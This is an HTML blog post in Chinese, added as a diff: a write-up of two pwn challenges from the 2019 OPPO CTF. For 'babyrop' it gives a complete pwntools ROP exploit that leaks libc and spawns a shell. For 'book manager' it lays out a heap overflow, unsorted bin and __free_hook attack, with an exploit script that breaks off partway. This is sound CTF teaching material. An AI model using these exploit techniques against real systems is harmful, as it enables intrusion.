@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        2019OPPO网络安全挑战赛-两道pwn - 萝卜
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+     你若盛开，清风自来！ 
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg">
+        </div>
+        <div class="name">
+            萝卜
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li>
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li>
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li>
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#babyrop"><span class="toc-text">babyrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#book-manager"><span class="toc-text">book manager</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 你若盛开，清风自来！ </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        2019OPPO网络安全挑战赛-两道pwn
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-08-26 20:22:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#WP" title="WP">WP</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+
+    </div>
+    <div class="post-content no-indent">
+        <h2 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h2><p>查保护：<br>32位，NX和<code>Full RELRO</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">一筐萝卜➜ ogeek  checksec --file babyrop </span><br><span class="line">[*] <span class="string">'/root/ctf/ogeek/babyrop'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p>
+<p>main函数首先从<code>/dev/urandom</code>文件中读取4个字符到buf中</p>
+<blockquote>
+<p>/dev/urandom生成随机数的速度要快很多，一般就使用/dev/urandom获取随机数。</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80486BB();</span><br><span class="line">  fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = sub_804871F(buf);</span><br><span class="line">  sub_80487D0(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>sub_804871F</code>函数中让输入一个数，然后用<code>strlen</code>函数来获取我们读入的长度，然后再用<code>strncmp</code>函数来比较，首先我们知道<code>strlen</code>函数遇到<code>\x00</code>字符就停止了，倘若我们第一个输入的就是<code>\x00</code>那么岂不是就比较0个字节，然后就恒等，绕过去了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_804871F</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Ch] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">7</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v5; <span class="comment">// [esp+33h] [ebp-25h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">"%ld"</span>, a1);</span><br><span class="line">  v6 = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">  buf[v6 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, &amp;s, v1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Correct\n"</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>sub_80487D0</code>函数用于读取，读取的数量得看参数得值，而传入这个函数的参数时上一个函数的返回值，上一个函数的返回值我们可以控制，进而就可以造成任意地址输入，造成可以覆盖ret地址，（最大长度是<code>\xff</code>），然后就是平常ROP拿到shell</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">cdecl <span class="title">sub_80487D0</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+11h] [ebp-E7h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0x7F</span> )</span><br><span class="line">    result = read(<span class="number">0</span>, &amp;buf, <span class="number">0xC8</span>u);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = read(<span class="number">0</span>, &amp;buf, a1);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># r = process("./babyrop")</span></span><br><span class="line"><span class="comment"># r = remote("47.112.137.238",13337)</span></span><br><span class="line"> </span><br><span class="line">r = remote(<span class="string">"47.112.137.238"</span>,<span class="number">13337</span>)</span><br><span class="line">file = ELF(<span class="string">"./babyrop"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so.rop"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("/lib/i386-linux-gnu/libc.so.6")</span></span><br><span class="line">write_plt = file.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = file.got[<span class="string">'write'</span>]</span><br><span class="line">payload = <span class="string">"\x00"</span>+<span class="string">"\xff"</span>*<span class="number">8</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">"Correct\n"</span>)</span><br><span class="line">offset = <span class="number">0xE7</span></span><br><span class="line">main_addr = <span class="number">0x8048825</span></span><br><span class="line">payload = <span class="string">"a"</span>*(offset+<span class="number">4</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">"write_addr:"</span>+hex(write_addr))</span><br><span class="line">base_addr = write_addr - libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">log.info(<span class="string">"base_addr:"</span>+hex(base_addr))</span><br><span class="line">system_addr = base_addr+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = base_addr+<span class="number">0x0015902b</span></span><br><span class="line">payload = <span class="string">"\x00"</span>+<span class="string">"\xff"</span>*<span class="number">8</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">payload = <span class="string">"a"</span>*(offset+<span class="number">4</span>)+p32(system_addr)+<span class="string">"aaaa"</span>+p32(binsh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
+<h2 id="book-manager"><a href="#book-manager" class="headerlink" title="book manager"></a>book manager</h2><p>这道题说实话并不难，但是程序的流程我一开始分析的透彻，导致我花了一天的时间，自闭</p>
+<p>保护全开，64位程序</p>
+<p>有八个选项：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_CA2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n=========================="</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n      Book Manager"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n=========================="</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n1) Add a chapter          "</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n2) Add a section          "</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n3) Add text               "</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n4) Remove a chapter       "</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n5) Remove a section       "</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n6) Remove text            "</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n7) Book preview           "</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n8) Update                 "</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n9) Exit                   "</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n=========================="</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"\nYour choice:"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在<code>Add text</code>中存在长度的溢出，输入长度只限制了不能大于<code>0x100</code>，没有其他限制，导致堆溢出，我们可以利用这个点来<code>leak libc</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"\nHow many chapters you want to write:"</span>, &amp;s2);</span><br><span class="line">v7 = sub_EB7();</span><br><span class="line"><span class="keyword">if</span> ( v7 &lt;= <span class="number">0x100</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v2 = *(*(a1 + <span class="number">8</span> * (v5 + <span class="number">4L</span>L)) + <span class="number">8</span> * (i + <span class="number">4L</span>L));</span><br><span class="line">  *(v2 + <span class="number">32</span>) = <span class="built_in">malloc</span>(v7);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nText:"</span>);</span><br><span class="line">  sub_DAF(&amp;s, <span class="number">0x100</span>u);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  <span class="built_in">memcpy</span>(*(*(*(a1 + <span class="number">8</span> * (v5 + <span class="number">4L</span>L)) + <span class="number">8</span> * (i + <span class="number">4L</span>L)) + <span class="number">32L</span>L), &amp;s, v3);</span><br></pre></td></tr></table></figure>
+<p>最鸡肋的地方在输入函数<code>sub_DAF</code>，编辑前要用<code>memset</code>清0，长度就是要编辑的长度，所以我们要伪造后面的chunk<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_DAF</span><span class="params">(<span class="keyword">void</span> *a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-214h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">520</span>]; <span class="comment">// [rsp+20h] [rbp-210h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+228h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(a1, <span class="number">0</span>, a2);</span><br><span class="line">  read(<span class="number">0</span>, s, a2 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; a2 + <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[i] == <span class="string">'\n'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      s[i] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(a1, s, i);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>另一个漏洞点就是在<code>update</code>中的修改<code>Text</code>处，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">if ( !strcmp(&amp;s, &quot;Text&quot;) )</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;\nSection name:&quot;, &quot;Text&quot;);</span><br><span class="line">  sub_DAF(&amp;s, 0x20u);</span><br><span class="line">  while ( v6 &lt;= 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *(a1 + 8 * (v6 + 4LL)) )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( v7 &lt;= 9 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( *(*(a1 + 8 * (v6 + 4LL)) + 8 * (v7 + 4LL)) &amp;&amp; !strcmp(&amp;s, *(*(a1 + 8 * (v6 + 4LL)) + 8 * (v7 + 4LL))) )</span><br><span class="line">        &#123;</span><br><span class="line">          printf(&quot;\nNew Text:&quot;);</span><br><span class="line">          sub_DAF(*(*(*(a1 + 8 * (v6 + 4LL)) + 8 * (v7 + 4LL)) + 32LL), 255u);</span><br><span class="line">          printf(&quot;\nUpdated&quot;, 255LL);</span><br><span class="line">          return __readfsqword(0x28u) ^ v9;</span><br><span class="line">        &#125;</span><br><span class="line">        ++v7;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v6;</span><br><span class="line">  &#125;</span><br><span class="line">  goto LABEL_34;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里有一个<code>0xff</code>长度的输入，但是只能edit第一个book的第一个<code>section</code>，这里很是难受，对于这里就要去前面之前构造chunk的时候要想到后门的需求</p>
+<p>攻击流程：</p>
+<ul>
+<li>利用第一个溢出来<code>leak libc</code></li>
+<li>然后利用第二个溢出构造触发<code>Unsorted Bin Attack</code>，在<code>__free_hook</code>的上方写上<code>main_area+88</code>地址</li>
+<li>利用<code>double free</code>，创建一个在<code>__free_hook</code>上方的chunk达到可以控制<code>__free_hook</code>指针，然后覆盖成<code>system</code>的地址</li>
+<li>调用<code>free</code>，来释放一个名字叫<code>/bin/sh</code>的chunk，达到getshell</li>
+</ul>
+<p>exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># r = process("./bookmanager")</span></span><br><span class="line">file = ELF(<span class="string">"./bookmanager"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so.book"</span>)</span><br><span class="line">r = remote(<span class="string">"47.112.115.30"</span>,<span class="number">13337</span>)</span><br><span class="line">sl = <span class="keyword">lambda</span> x : r.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x : r.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : r.sendlineafter(x,y)</span><br><span class="line">rud = <span class="keyword">lambda</span> x : r.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x : r.recvuntil(x)</span><br><span class="line">li = <span class="keyword">lambda</span> name,x : log.info(name+<span class="string">":"</span>+hex(x))</span><br><span class="line">ri = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_book_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    ru(<span class="string">"Name of the book you want to create: "</span>)</span><br><span class="line">    sl(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_c</span><span class="params">(c_name)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">"1"</span>)</span><br><span class="line">    ru(<span class="string">"Chapter name:"</span>)</span><br><span class="line">    sl(c_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_s</span><span class="params">(c_name,s_name)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">"2"</span>)    </span><br><span class="line">    ru(<span class="string">"Which chapter do you want to add into:"</span>)</span><br><span class="line">    sl(c_name)</span><br><span class="line">    ru(<span class="string">"0x"</span>)</span><br><span class="line">    addr = eval(rud(<span class="string">"\n"</span>))</span><br><span class="line">    ru(<span class="string">"Section name:"</span>)</span><br><span class="line">    sl(s_name)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_t</span><span class="params">(s_name,t_size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">"3"</span>)      </span><br><span class="line">    ru(<span class="string">"Which section do you want to add into:"</span>)</span><br><span class="line">    sl(s_name)</span><br><span class="line">    ru(<span class="string">"How many chapters you want to write:"</span>)</span><br><span class="line">    sl(str(t_size))</span><br><span class="line">    ru(<span class="string">"Text:"</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_t</span><span class="params">(s_name)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">"6"</span>)</span><br><span class="line">    ru(<span class="string">"Section name:"</span>)</span><br><span class="line">    sl(s_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_c</span><span class="params">(c_name)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">"4"</span>)</span><br><span class="line">    ru(<span class="string">"Chapter name:"</span>)</span><br><span class="line">    sl(c_name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_s</span><span class="params">(s_name)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">"5"</span>)</span><br><span class="line">    ru(<span class="string">"Section name:"</span>)</span><br><span class="line">    sl(s_name)    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">"7"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(u_name,s_name,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">"8"</span>)</span><br><span class="line">    ru(<span class="string">"What to update?(Chapter/Section/Text):"</span>)   </span><br><span class="line">    sl(u_name)</span><br><span class="line">    ru(<span class="string">"Section name:"</span>)</span><br><span class="line">    sl(s_name)</span><br><span class="line">    ru(<span class="string">"New Text:"</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set_book_name(<span class="string">"radish"</span>)</span><br><span class="line"><span class="comment"># add_c("c0")#0x80</span></span><br><span class="line"><span class="comment"># add_c("c1")#0x80</span></span><br><span class="line"><span class="comment"># add_s("c0","s0")#0x30</span></span><br><span class="line"><span class="comment"># 